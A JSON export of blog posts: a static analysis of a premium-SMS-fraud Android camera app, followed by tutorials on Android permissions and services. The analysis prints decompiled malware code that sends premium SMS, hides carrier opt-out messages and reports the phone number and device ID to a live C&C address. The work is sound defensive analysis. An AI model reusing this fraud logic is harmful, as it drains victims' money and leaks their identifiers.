


[{"content":"","date":"10 أغسطس 2025","externalUrl":null,"permalink":"/superBLog/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"this is ex 1\u0026amp;2 from a live workshop that THE maddi stone done on YouTube that teach android security static analysis basics\nyoutube amazing workshop by the way site for exercise and notes\nExercise Context #\rYou are a malware analyst for Android applications. You are concerned that this sample maybe doing premium SMS fraud, meaning that it sends an SMS to a premium phone number without disclosure \u0026amp; user consent.\nStart #\rwhat are we looking at ? #\rPremium SMS fraud, also referred to as SMS toll fraud, SMS pumping, or International Revenue Share Fraud (IRSF), is a prevalent form of mobile malware that exploits Android devices to send text messages to premium-rate numbers without user consent. This fraudulent activity results in significant financial losses for users, with charges appearing on their phone bills, often unbeknownst to them until billing statements arrive.\nFor instance, Twitter (now X) reported losing approximately $60 million annually due to SMS pumping fraud in 2023.\nyou can get the sample here\nHow it\u0026rsquo;s done #\rDeceptive Applications #\rMalicious apps hide as legitimate software, such as keyboards, QR code scanners, photo editors, or games To trick users into granting permissions or entering personal details, such as phone numbers, under the guise of unlocking features. For example, apps may prompt users to enter their phone number to access a \u0026ldquo;free\u0026rdquo; service.\nAdvanced Malware Techniques #\rSophisticated malware, such as Stels and Joker, uses complex methods to evade detection and execute fraud:\nCommand and Control (C2) Communication: Malware communicates with remote servers to receive instructions, such as sending SMS to specific premium numbers or subscribing to services. Dynamic Code Loading: To avoid static analysis, malware downloads malicious code at runtime, often using encryption (e.g., AES, XOR \u0026hellip;) and obfuscation techniques. SMS Interception and Suppression: Malware intercepts SMS notifications (e.g., subscription confirmations) using permissions like RECEIVE_SMS or NotificationListenerService, and suppresses them to hide activities from the user. Network Targeting: Malware checks the Mobile Country Code (MCC) and Mobile Network Code (MNC) to target specific operators or regions, ensuring charges are applied effectively. Cellular Connection Preference: Malware may disable Wi-Fi or force the device to use a cellular network to ensure charges are billed to the user\u0026rsquo;s mobile account. Exploiting Permissions #\rEarly Android versions had weaker permission models, allowing apps to send premium SMS without user interaction. Since Android 4.2, user confirmation is required, but malware may exploit vulnerabilities or deceive users into granting permissions like SEND_SMS, READ_SMS, or CHANGE_WIFI_STATE.\nReal-Life Cases #\rOther than this example Several high-profile campaigns occurred that shows the scale and impact of premium SMS fraud:\nUltimaSMS Campaign #\rOverview: Discovered by Avast in May 2021, the UltimaSMS campaign involved 151 malicious apps with over 10.5 million downloads. These apps, including Ultima Keyboard 3D Pro, spanned categories like keyboards, QR code scanners, video editors, and games. Mechanism: Users were prompted to enter their phone numbers and email addresses to access advertised features, only to be subscribed to premium SMS services costing up to $40 per month. The apps were promoted via social media platforms like Instagram and TikTok. Impact: Affected users in countries such as Egypt, Saudi Arabia, Pakistan, and the U.S. Although many apps were removed from the Google Play Store, 82 remained available as of October 19, 2021. Source: Avast Blog GriftHorse Platform #\rOverview: Active since November 2020, GriftHorse involved over 200 apps, as reported by Zimperium, targeting users in over 70 countries. Mechanism: Apps bombarded users with frequent popups (up to five per hour) claiming they had won prizes, leading to a webpage that subscribed them to premium SMS services upon entering their phone number. Impact: The campaign siphoned tens of millions of dollars from victims, with apps designed to appear benign and evade antivirus detection. Source: Dark Reading Stels Malware #\rOverview: Analyzed by SecureWorks in 2013, Stels was distributed via spam campaigns and fake Adobe Flash Player updates. Mechanism: It installed as a service, sent SMS to premium numbers, made calls, stole contacts, and communicated with C2 servers using non-encrypted HTTP POST requests. It also intercepted SMS to bypass two-factor authentication for banking fraud. Impact: Targeted users globally, often in conjunction with banking trojans like Zeus. Source: SecureWorks Joker Malware #\rOverview: Identified in 24 apps with over 472,000 installs in 2019, as reported by CSIS TechBlog. Mechanism: A two-stage Trojan, the loader stage checked the MCC to target specific countries, downloaded encrypted configurations, and loaded a core component that subscribed users to premium services (e.g., 50 DKK/week in Denmark). It stole SMS and contact data, using dynamic code execution to evade detection. Impact: Targeted 37 countries, including Australia, Brazil, and the UK, with sophisticated evasion techniques. Source: Medium Online Platforms Findings #\rusing online sandboxes and searching using hash and uploading sample we find the following\nVirus Total Poly Swarm Hybrid Analysis Getting our hands dirty #\r1. Manifest #\rLooking at the permissions given its straight forward that\u0026rsquo;s this a malware. looking at them we can separate permissions into 2 categories (what\u0026rsquo;s normal for a camera filter app and what\u0026rsquo;s sketchy behavior )\nNormal for a Camera App:\nCAMERA: Essential for core functionality. WRITE_EXTERNAL_STORAGE: Needed to save photos/videos. READ_EXTERNAL_STORAGE: Useful for accessing existing media. INTERNET: Common for cloud features, sharing, or ads. ACCESS_NETWORK_STATE: Reasonable for checking connectivity. BuT:\ncan be used to\nWRITE_EXTERNAL_STORAGE: write malicious files, overwrite legitimate files, or steal data from storage READ_EXTERNAL_STORAGE: steal personal files, such as photos, documents, or other sensitive data. INTERNET: Used to communicate with a command-and-control (C2) server, send stolen data, or download malicious payloads. Suspicious/Dangerous for a Camera App (Red Flags):\nSEND_SMS: Highly indicative of SMS premium malware, as camera apps have no legitimate need to send SMS. READ_PHONE_STATE: often used by malware to harvest device identifiers. DELETE_CACHE_FILES:May could be used to disrupt other apps behavior. DELETE_PACKAGES:May allows uninstalling other apps, which is not needed for a camera app. READ_LOGS:May used to extract sensitive system information. WAKE_LOCK: May could enable background malicious activity. ACCESS_WIFI_STATE: May used for optimizing uploads. com.google.android.c2dm.permission.RECEIVE and C2D_MESSAGE: May Receive commands from a C2 server, triggering malicious actions like sending SMS or downloading additional payloads. Going deeper #\rThere are different ways to send \u0026amp; interact with sms messages but to list main methods:\nsendTextMessage sendMultimediaMessage : send messages containing images, audio, or other media content. sendDataMessage : sending binary data or messages to specific applications rather than regular text messages. sendMultipartTextMessage :For sending long SMS messages that need to be split into multiple parts divideMessage : Splits a long message into multiple parts that can be sent separately so using jadx to look for any of these methods and bingo\nbut also why not look for the keyword sms to see if there is other references and we find the following\nSetting the ground (BootService.class) #\rHere is a simplified overview of each method in the class:\npublic class BootService extends Service { private void init() { /* Initializes FirebaseAnalytics and registers MyReceiver with intent filters */ } class MyReceiver extends BroadcastReceiver { @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent) { /* Processes received intents, handling SMS send results */ } } private String getPhoneNumber() { /* Uses TelephonyManager */ } private String getDeviceId() { /* Gets IMEI */ } public void sendmessageStatus(String status) { /* Sends HTTP POST to C\u0026amp;C server with phone, status, and device ID */ } } and this is a Flow of service and how things connect\nflowchart TD\rA[Device Boot] --\u003e B[BootService Starts]\rB --\u003e C[Register Receivers]\rC --\u003e D1[Monitor SMS_RECEIVED]\rC --\u003e D2[Monitor SENT_HUGE_SMS_ACTION]\rC --\u003e D3[Monitor MY_RECEIVER]\rD2 --\u003e E{SMS Send Result}\rE --\u003e|Code -1| F[Report 'yes' to C\u0026C]\rE --\u003e|Code 0| G[Report 'no' to C\u0026C]\rE --\u003e|Code 1-4| H[Report Error Code]\rF --\u003e I[Trigger Loading.ACTION_START]\rI --\u003e J[Fetch New SMS Targets]\rJ --\u003e K[Send More Premium SMS]\rD1 --\u003e L[Intercept Incoming SMS]\rL --\u003e M[Scan for Block/Stop Keywords]\rM --\u003e N[Auto-Delete Detection Messages]\rDetailed Stages: #\rPersistence\nAuto-starts on device boot via BootService Registers 3 critical receivers for SMS monitoring Victim Profiling\nHarvests phone number via TelephonyManager.getLine1Number() Collects device ID using TelephonyManager.getDeviceId() SMS Operation\nListens for SENT_HUGE_SMS_ACTION broadcasts Maps SMS status codes: -1 → Success (billed) 0 → Generic failure 1-4 → Carrier-specific errors C\u0026amp;C Communication\nSends POST request to:\nhttp://139.59.107.168:8088/smspostback?phone=[NUMBER]\u0026amp;status=[STATUS]\u0026amp;diviceid=[ID] Uses persistent connection with 5s timeout Logs server response (SUCCESS/ERROR) Chained Malicious Payload\nOn successful SMS (status=yes): Broadcasts Loading.ACTION_START Triggers new premium SMS waves Updates target numbers from C\u0026amp;C Anti-Detection\nIntercepts incoming SMS (SMS_RECEIVED) Deletes messages containing \u0026ldquo;STOP\u0026rdquo;, \u0026ldquo;BLOCK\u0026rdquo;, or \u0026ldquo;CANCEL\u0026rdquo; Sending the sms (loading.class) #\rThis is the main payload of the SMS premium malware operation. We have seen that this is where sms are sent but how does it know the phone number to send or the text content and even how it makes the user send it without the user suspecting any thing.\nThis class handles user interaction, permission requests, SMS sending, and integration with BootService. Simply It fetches premium SMS details from a C\u0026amp;C server based on the device\u0026rsquo;s SIM operator, tricks the user into granting permissions and clicking a button (disguised as part of the camera setup), sends the SMS, and triggers reporting via BootService. Upon success, it launches the legitimate CameraActivity as if nothing happened .\nAnd here is how it works in details\n0. Gaining your permission #\rpublic void onClick(View v) { if (Build.VERSION.SDK_INT \u0026lt; 23) { if (Loading.this.service != null \u0026amp;\u0026amp; Loading.this.content != null) { Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; } int checkCallPhonePermission = ContextCompat.checkSelfPermission(Loading.this.getApplicationContext(), \u0026#34;android.permission.SEND_SMS\u0026#34;); if (Loading.this.videoShare.equals(AppEventsConstants.EVENT_PARAM_VALUE_YES) \u0026amp;\u0026amp; checkCallPhonePermission == 0) { if (Loading.this.service != null \u0026amp;\u0026amp; Loading.this.content != null) { Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; } return; } ActivityCompat.requestPermissions(Loading.this, new String[]{\u0026#34;android.permission.SEND_SMS\u0026#34;}, 1); public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) { super.onRequestPermissionsResult(requestCode, permissions, grantResults); if (requestCode == 1 \u0026amp;\u0026amp; grantResults[0] == 0) { if (this.service != null \u0026amp;\u0026amp; this.content != null) { sendMessage(this.service, this.content); return; } return; } Toast.makeText(this, \u0026#34;Please allow access！\u0026#34;, 1).show(); } Handles SMS permission grant, sends if approved; toasts denial.\n1. Command \u0026amp; Control Communication #\rString spec = \u0026#34;http://139.59.107.168:8088/appsharejson?code=\u0026#34; + code; Contacts the same C\u0026amp;C server as BootService Sends victim\u0026rsquo;s mobile operator code (getSimOperator()) to get targeted attack instructions Receives JSON payload with premium numbers and SMS content to send 2. Attack Configuration #\rThe malware receives a JSON response containing:\nthis.content = object.getString(\u0026#34;content\u0026#34;); // SMS text to send this.rule = object.getString(\u0026#34;rule\u0026#34;); // Display rules/instructions this.service = object.getString(\u0026#34;service\u0026#34;); // Premium number to target this.status = object.getString(\u0026#34;code\u0026#34;); // Status code this.button = object.getString(\u0026#34;button\u0026#34;); // Button text (deception) this.IMEIS = object.getString(\u0026#34;imei\u0026#34;); // IMEI targeting rules this.imeicontent = object.getString(\u0026#34;imeicontent\u0026#34;); // IMEI-specific content 3. Carrier-Specific Targeting #\rif (operator != null \u0026amp;\u0026amp; this.imeicontent != null) { String[] imeicontents = this.imeicontent.split(\u0026#34;,\u0026#34;); // Parse format: \u0026#34;operator:premium_number:sms_content\u0026#34; if (operator.equals(imei[0])) { this.shareSend = 1; this.service = imei[1]; // Premium number this.content = imei[2]; // SMS content } } The malware:\nIdentifies victim\u0026rsquo;s mobile carrier Receives carrier-specific premium numbers and content Maximizes profit by targeting each carrier\u0026rsquo;s premium services 4. Deceptive User Interface #\rif (this.rule != null) { this.ms_show.setText(this.rule); // Shows fake instructions } if (this.button != null) { this.button_sensms.setText(this.button); // Disguises malicious button } The malware disguises the SMS sending button with innocent-looking text received from the C\u0026amp;C server.\n5. Premium SMS Execution #\rpublic void sendMessage(String mobile, String content) { Bundle bundle = new Bundle(); bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, \u0026#34;SEND_SMS\u0026#34;); this.mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle); // Logs event for attacker tracking Intent itSend = new Intent(\u0026#34;SENT_HUGE_SMS_ACTION\u0026#34;); itSend.putExtras(bundle); SmsManager sms = SmsManager.getDefault(); PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728); try { if (content.length() \u0026gt; 70) { List\u0026lt;String\u0026gt; msgs = sms.divideMessage(content); // Splits long messages for multipart (higher costs) for (String msg : msgs) { sms.sendTextMessage(mobile, null, msg, sentintent, null); } } else { sms.sendTextMessage(mobile, null, content, sentintent, null); } } catch (Exception e) { /* Saves failure state, prints error */ } Sends SMS to premium numbers (mobile parameter) Handles long messages by splitting them (more charges per message) Uses SENT_HUGE_SMS_ACTION intent to track success/failure by using PendingIntent to trigger BootService 6. Persistence \u0026amp; State Management #\rSharedPreferences sharedPreferences = getSharedPreferences(\u0026#34;videoLibrary\u0026#34;, 0); this.videoShare = sharedPreferences.getString(\u0026#34;videoShare\u0026#34;, \u0026#34;\u0026#34;); // After successful SMS: editor.putString(\u0026#34;videoShare\u0026#34;, AppEventsConstants.EVENT_PARAM_VALUE_YES); Tracks whether premium SMS was already sent Prevents repeated charges (to avoid suspicion) Uses innocent-sounding \u0026ldquo;videoLibrary\u0026rdquo; preference name Attack Flow (Loading class + service): #\rflowchart TD\rA[Device Boot] --\u003e B[BootService Starts]\rB --\u003e C[Register Receivers]\rC --\u003e D1[Monitor SMS_RECEIVED]\rC --\u003e D2[Monitor SENT_HUGE_SMS_ACTION]\rC --\u003e D3[Monitor MY_RECEIVER]\rE[User Launches App] --\u003e F[Loading Activity Starts]\rF --\u003e G[Start BootService]\rG --\u003e H[Fetch Config from C\u0026C]\rH --\u003e I{Carrier Match Found?}\rI --\u003e|Yes| J[Use Carrier-Specific\\\\nPremium Number/Content]\rI --\u003e|No| K[Use Default\\\\nSMS Template]\rJ --\u003e L[Build Deceptive UI]\rK --\u003e L\rL --\u003e M{User Clicks\\\\nDisguised Button?}\rM --\u003e|No| N[Redirect to\\\\nCameraActivity]\rM --\u003e|Yes| O{Android \u003c 6.0\\\\nMarshmallow}\rO --\u003e|Yes| P[Send SMS Immediately]\rO --\u003e|No| Q{Has SMS\\\\nPermission?}\rQ --\u003e|No| R[Request Permission\\\\nRepeatedly]\rQ --\u003e|Yes| P\rP --\u003e S[Split Message\\\\nif \u003e70 Characters]\rS --\u003e T[Send Premium SMS]\rT --\u003e U[Log Event to Firebase]\rU --\u003e V[Broadcast\\\\nSENT_HUGE_SMS_ACTION]\rV --\u003e D2\rD2 --\u003e W{SMS Result Code}\rW --\u003e|Success -1| X[Report 'yes'\\\\nto C\u0026C Server]\rW --\u003e|Failure 0-4| Y[Report Error Code\\\\nto C\u0026C]\rX --\u003e Z[Trigger\\\\nLoading.ACTION_START]\rZ --\u003e AA[Mark Preference\\\\n'videoShare=yes']\rAA --\u003e AB[Open CameraActivity\\\\nas Diversion]\rResources #\rThe Hacker News: Over 10 Million Android Users Targeted With Premium SMS Scam Apps Avast Blog: Premium SMS Scam Apps on Play Store NIST Mobile Threat Catalogue: APP-16 Microsoft Security Blog: Toll fraud malware SecureWorks: Stels Android Trojan Malware Analysis Medium: Analysis of Joker — A Spy \u0026amp; Premium Subscription Bot on GooglePlay ResearchGate: Android SMS Malware: Vulnerability and Mitigation ","date":"10 أغسطس 2025","externalUrl":null,"permalink":"/superBLog/posts/malware/mobile/thicamera/","section":"","summary":"","title":"Premium SMS Fraud - ThaiCamera analysis","type":"posts"},{"content":"","date":"10 أغسطس 2025","externalUrl":null,"permalink":"/superBLog/tags/sms-fraud/","section":"Tags","summary":"","title":"Sms Fraud","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/tags/0/","section":"Tags","summary":"","title":"0","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/andorid/","section":"Tags","summary":"","title":"Andorid","type":"tags"},{"content":"\r1. Android Sandboxing #\rAndroid uses application sandboxing through user-based isolation. The system operates on a principle of least privilege where each application has its own unique Linux user ID (UID), and must explicitly request access to protected resources. Preventing applications from accessing each other\u0026rsquo;s data without explicit permissions.\nUser ID Implementation: #\rUser Type UID Range Example Storage Location System Users 1000-9999 System (1000), Radio (1001) Defined in kernel (android_filesystem_config.h) Application Users Starting at 10000 User application (e.g., 10129) Tracked in /data/system/packages.xml Example filesystem representation:\n/data/data/u0_a129/ (where \u0026lsquo;a129\u0026rsquo; represents UID 10129) 2. Permission Storage and Management #\rAndroid permissions are defined and stored in multiple locations:\nSystem Permission Files: #\rFile Location Purpose Contents /etc/permissions/platform.xml Defines core system permissions System UID-permission mappings /data/system/packages.xml Tracks installed apps\u0026rsquo; permissions App UIDs, granted permissions, certificates Example from packages.xml:\n\u0026lt;package name=\u0026#34;com.apphacking.privacy\u0026#34; codePath=\u0026#34;...\u0026#34; nativeLibraryPath=\u0026#34;...\u0026#34;\u0026gt; \u0026lt;userId\u0026gt;10129\u0026lt;/userId\u0026gt; \u0026lt;cert\u0026gt;...\u0026lt;/cert\u0026gt; \u0026lt;perms\u0026gt; \u0026lt;item name=\u0026#34;android.permission.READ_CONTACTS\u0026#34; granted=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;item name=\u0026#34;android.permission.INTERNET\u0026#34; granted=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/perms\u0026gt; \u0026lt;/package\u0026gt; 3. Permission Types #\rBy Source (who gave it) #\rPermission Source Definition Example System Permissions Pre-defined by Android android.permission.READ_CONTACTS Custom Permissions Defined by applications com.apphacking.privacy.USER_INFO By Grant Time (when permission is applied) #\r3.1 Install-time Permissions #\rAutomatically granted when app is installed - minimal risk to privacy/security.\nNormal Permissions:\nCover low-risk operations Granted at installation without user interaction Examples: INTERNET, VIBRATE Signature Permissions:\nGranted only to apps signed with same developer certificate Used for secure communication between same-developer apps Example: Data sharing between messaging and calendar apps from same developer 3.2 Runtime Permissions (Dangerous) #\rIntroduced in Android 6.0 (API level 23) - protect sensitive user data.\nKey Characteristics:\nRequire explicit user approval during app use Can be granted or denied by users Apps must handle denials gracefully Examples:\nandroid.permission.CAMERA android.permission.ACCESS_FINE_LOCATION android.permission.READ_CONTACTS 3.3 Special Permissions #\rAllow access to powerful system features via \u0026ldquo;Special app access\u0026rdquo; settings.\nExamples:\nandroid.permission.SYSTEM_ALERT_WINDOW - Draw over other apps android.permission.WRITE_SETTINGS - Modify system settings 4. Protection Levels #\rProtection Level Description User Experience Risk Level normal Lower-risk permissions for isolated features Automatically granted at installation Low dangerous Higher-risk permissions accessing private data Explicit user consent required at runtime Medium-High signature Only granted to apps with matching certificate Silently granted if certificate matches High knownSigner Only granted to apps with allowed certificate Silently granted if certificate listed High signature|privileged For matching signature OR privileged system apps Silently granted for system apps Very High [!note] signatureOrSystem is deprecated since API level 23 (Android 6.0). It was previously used to grant permissions to apps that were either signed with the same certificate as the system or were pre-installed system apps.\n6. Using Permissions #\r6.1 Declaring Permissions #\rPermissions are declared in AndroidManifest.xml using the \u0026lt;uses-permission\u0026gt; tag.\nBasic Declaration:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.CAMERA\u0026#34; /\u0026gt; Version-Specific Declaration:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_EXTERNAL_STORAGE\u0026#34; android:maxSdkVersion=\u0026#34;28\u0026#34; /\u0026gt; 6.2 Checking Permission Status (if the app has it or not) #\rimport androidx.core.content.ContextCompat; import android.content.pm.PackageManager; if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) { // Permission is granted, proceed with camera access } else { // Permission is not granted, request it } 6.3 Requesting Runtime Permissions #\rModern Approach (ActivityResultLauncher) #\rSingle Permission:\nimport androidx.activity.result.ActivityResultLauncher; import androidx.activity.result.contract.ActivityResultContracts; private ActivityResultLauncher\u0026lt;String\u0026gt; requestPermissionLauncher = registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -\u0026gt; { if (isGranted) { // Permission granted, proceed with the action } else { // Permission denied, handle accordingly } }); // Request permission when needed if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { requestPermissionLauncher.launch(Manifest.permission.CAMERA); } Multiple Permissions:\nprivate ActivityResultLauncher\u0026lt;String[]\u0026gt; requestMultiplePermissionsLauncher = registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), permissions -\u0026gt; { permissions.forEach((permission, isGranted) -\u0026gt; { if (isGranted) { // Permission granted } else { // Permission denied } }); }); requestMultiplePermissionsLauncher.launch(new String[]{ Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION }); Legacy Approach (requestPermissions) #\rRequest:\nimport androidx.core.app.ActivityCompat; ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1); Handle Result:\n@Override public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) { super.onRequestPermissionsResult(requestCode, permissions, grantResults); if (requestCode == 1) { if (grantResults.length \u0026gt; 0 \u0026amp;\u0026amp; grantResults[0] == PackageManager.PERMISSION_GRANTED) { // Permission granted } else { // Permission denied } } } 7. Creating Custom Permissions #\r7.1 Defining Custom Permissions #\rCustom permissions are defined in AndroidManifest.xml using the \u0026lt;permission\u0026gt; tag:\n\u0026lt;permission android:name=\u0026#34;com.example.myapp.permission.CUSTOM_PERMISSION\u0026#34; android:protectionLevel=\u0026#34;dangerous\u0026#34; android:label=\u0026#34;@string/permission_label\u0026#34; android:description=\u0026#34;@string/permission_description\u0026#34; android:permissionGroup=\u0026#34;android.permission-group.STORAGE\u0026#34; /\u0026gt; String Resources (res/values/strings.xml):\n\u0026lt;string name=\u0026#34;permission_label\u0026#34;\u0026gt;Access Custom Data\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;permission_description\u0026#34;\u0026gt;Allows the app to access custom app data.\u0026lt;/string\u0026gt; or Directly:\n\u0026lt;permission android:label=\u0026#34;Allows reading user information\u0026#34; android:name=\u0026#34;com.apphacking.privacy.USER_INFO\u0026#34; android:protectionLevel=\u0026#34;dangerous\u0026#34;/\u0026gt; 7.2 Requesting Custom Permissions #\rOther apps request custom permissions like standard permissions:\n\u0026lt;uses-permission android:name=\u0026#34;com.example.myapp.permission.CUSTOM_PERMISSION\u0026#34; /\u0026gt; [!note] If custom permission has dangerous protection level, it must be requested at runtime\n8. Permission Request Process #\rPermission Request Flow: #\rDeveloper declares needed permissions in AndroidManifest.xml At installation/runtime, system processes these requests For dangerous permissions, system prompts user for approval If granted, permission is recorded in packages.xml Application can now access the protected functionality Technical Implementation: #\rApp\u0026rsquo;s UID is added to the group that has the requested permission This grants the Linux-level access needed for the permission System tracks granted state in packages.xml References #\rAndroid Permissions Overview Requesting Runtime Permissions Defining Custom Permissions Android Core AndroidManifest.xml App Permissions Best Practices https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/ ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/permissions/","section":"","summary":"","title":"Android Permissions","type":"posts"},{"content":"\rSummary #\rAndroid Services are application components designed to perform long-running operations in the background without providing a user interface. They enable apps to continue executing tasks even when users switch to other applications or when the app is closed.\n[!Who can use Services?]\nActivities: Can start and bind to services for background operations Other Services: Services can communicate with each other Broadcast Receivers: Can trigger service operations based on system events Content Providers: Can use services for data synchronization System Components: Android system can restart services based on configuration External Apps: Through proper permissions and exported services What Services Look Like #\rKey Components of a Service #\rA Service consists of several lifecycle methods and configuration options:\npublic class ExampleService extends Service { private MediaPlayer player; private final IBinder binder = new LocalBinder(); // Lifecycle callbacks @Override public void onCreate() { super.onCreate(); // One-time setup } @Override public int onStartCommand(Intent intent, int flags, int startId) { // Handle start requests return START_STICKY; // or START_NOT_STICKY, START_REDELIVER_INTENT } @Override public IBinder onBind(Intent intent) { return binder; // Return IBinder for bound services } @Override public boolean onUnbind(Intent intent) { return super.onUnbind(intent); } @Override public void onRebind(Intent intent) { super.onRebind(intent); } @Override public void onDestroy() { super.onDestroy(); // Cleanup resources } } [!Warning] Threading Considerations Services run on the main thread by default. For intensive operations, create separate threads to avoid ANR (Application Not Responding) errors.\nJob Service #\rA very common service you might see exposed is an Android Job Scheduler service. However due to the android.permission.BIND_JOB_SERVICE permission this service cannot be directly interacted with and can usually be ignored when hunting for bugs.\nAndroidManifest.xml #\r\u0026lt;service android:name=\u0026#34;.MyJobService\u0026#34; android:permission=\u0026#34;android.permission.BIND_JOB_SERVICE\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;/service\u0026gt; ![[jobService.png]]\nTypes of Services #\r1. Started Services (Unbound) #\rServices that run independently after being started when bound method returns nothing or throws an exception\nLifecycle: Started with startService(), runs indefinitely until stopped Use Cases: Music playback, file downloads, data synchronization etc\u0026hellip; Stopping: Must be explicitly stopped with stopSelf() or stopService() ex:\npublic class MusicService extends Service { private MediaPlayer player; @Override public int onStartCommand(Intent intent, int flags, int startId) { player = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI); player.setLooping(true); player.start(); return START_STICKY; // Restart if killed by system } @Override public void onDestroy() { super.onDestroy(); if (player != null) { player.stop(); player.release(); } } @Override public IBinder onBind(Intent intent) { return null; // Not providing binding } } Starting from Activity:\n// Start service Intent serviceIntent = new Intent(this, MusicService.class); startService(serviceIntent); // Stop service stopService(new Intent(this, MusicService.class)); Return Flags for onStartCommand() #\rFlag Behavior START_NOT_STICKY Don\u0026rsquo;t recreate service if killed START_STICKY Recreate service but don\u0026rsquo;t redeliver intent START_REDELIVER_INTENT Recreate service and redeliver last intent 2. Bound Services #\rServices that provide client-server interface for interaction\nThey get started to execute something in the background, and so called bound Services where an app can establish a connection and continuously exchange data with the other app. SO using onstartcommand is like a one way communication but now we can send \u0026amp; receive data\nLifecycle: Lives as long as components are bound to it Use Cases: IPC, data sharing, remote method calls Communication: Through IBinder interface Binding Methods #\r[!error] When talking to bound services with bindService() you will need to send an intent but also you will need to setup a ServiceConnection and pass it in bindService(intent,ServiceConnection)\nprivate ServiceConnection connection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName className, IBinder service) { } @Override public void onServiceDisconnected(ComponentName arg0) { } }; A. Extending Binder Class (Local Services) #\r[!note] we as attackers can\u0026rsquo;t bind to this service since only components inside app are allowed to bind to it and no one else\nBest for same-process communication\npublic class LocalService extends Service { private final IBinder binder = new LocalBinder(); public class LocalBinder extends Binder { LocalService getService() { return LocalService.this; } } @Override public IBinder onBind(Intent intent) { return binder; } } Client Activity:\npublic class BindingActivity extends Activity { LocalService mService; boolean mBound = false; private ServiceConnection connection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName className, IBinder service) { LocalService.LocalBinder binder = (LocalService.LocalBinder) service; mService = binder.getService(); mBound = true; } @Override public void onServiceDisconnected(ComponentName arg0) { mBound = false; } }; @Override protected void onStart() { super.onStart(); Intent intent = new Intent(this, LocalService.class); bindService(intent, connection, Context.BIND_AUTO_CREATE); } @Override protected void onStop() { super.onStop(); if (mBound) { unbindService(connection); mBound = false; } } } B. Using Messenger (Cross-Process) #\rBest for simple IPC without thread safety concerns\n[!info] A messenger service can easily be recognised by looking at the onBind() method that returns a IBinder object created from the Messenger class.\n[!note] The inline class extending Handler is contains a handleMessage() method that implements the actual service logic. The attacker can control the Message coming in.\npublic class MessengerService extends Service { static final int MSG_SAY_HELLO = 1; static class IncomingHandler extends Handler { private Context applicationContext; IncomingHandler(Context context) { applicationContext = context.getApplicationContext(); } @Override public void handleMessage(Message msg) { switch (msg.what) { case MSG_SAY_HELLO: Toast.makeText(applicationContext, \u0026#34;Hello!\u0026#34;, Toast.LENGTH_SHORT).show(); break; default: super.handleMessage(msg); } } } Messenger mMessenger; @Override public IBinder onBind(Intent intent) { mMessenger = new Messenger(new IncomingHandler(this)); return mMessenger.getBinder(); } } Client using Messenger:\npublic class ActivityMessenger extends Activity { Messenger mService = null; boolean bound; private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { mService = new Messenger(service); bound = true; } public void onServiceDisconnected(ComponentName className) { mService = null; bound = false; } }; public void sayHello(View v) { if (!bound) return; Message msg = Message.obtain(null, MessengerService.MSG_SAY_HELLO, 0, 0); try { mService.send(msg); } catch (RemoteException e) { e.printStackTrace(); } } } using looper\n```java public class MyMessageService extends Service { public static final int MSG_SUCCESS = 42; final Messenger messenger = new Messenger(new IncomingHandler(Looper.getMainLooper())); @Override // android.app.Service public IBinder onBind(Intent intent) { return this.messenger.getBinder(); } class IncomingHandler extends Handler { IncomingHandler(Looper looper) { super(looper); } @Override // android.os.Handler public void handleMessage(Message message) { if (message.what == 42) { // ... } else { super.handleMessage(message); } } } } A Looper is just a message pump that Runs an infinite loop on a thread to Pull messages from a MessageQueue then Dispatches/send them to the appropriate Handler and Keeps the thread alive to process messages\nC. Using AIDL (Android Interface Definition Language) #\rBest for complex multi-threaded IPC\nStep 1: Create AIDL file (IRemoteService.aidl):\nTo add aidl files you need to set it up in the the gradle build file and search for buildFeatures and if you cannot find this block, create it and set aidl to true\nbuildFeatures { aidl true } // IRemoteService.aidl\rpackage com.example.android;\rinterface IRemoteService {\rint getPid();\rvoid basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString);\r} Step 2: Implement Service:\npublic class RemoteService extends Service { @Override public IBinder onBind(Intent intent) { return binder; } private final IRemoteService.Stub binder = new IRemoteService.Stub() { public int getPid() { return Process.myPid(); } public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) { // Implementation } }; } Step 3: Client Implementation:\nIRemoteService iRemoteService; private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { iRemoteService = IRemoteService.Stub.asInterface(service); } public void onServiceDisconnected(ComponentName className) { iRemoteService = null; } }; 2. if the aidl already defined but in different app #\r1- if you will use this file to talk to service of a different app you need to set the name exactly as in the service , then\nright click on aidl folder and create a new package with the name in DESCRIPTOR click on the aidl file you created then choose refactor, move it in the folder you have ejus created in the file you are in change the package name from your app to the one in DESCRIPTOR rebuild the app 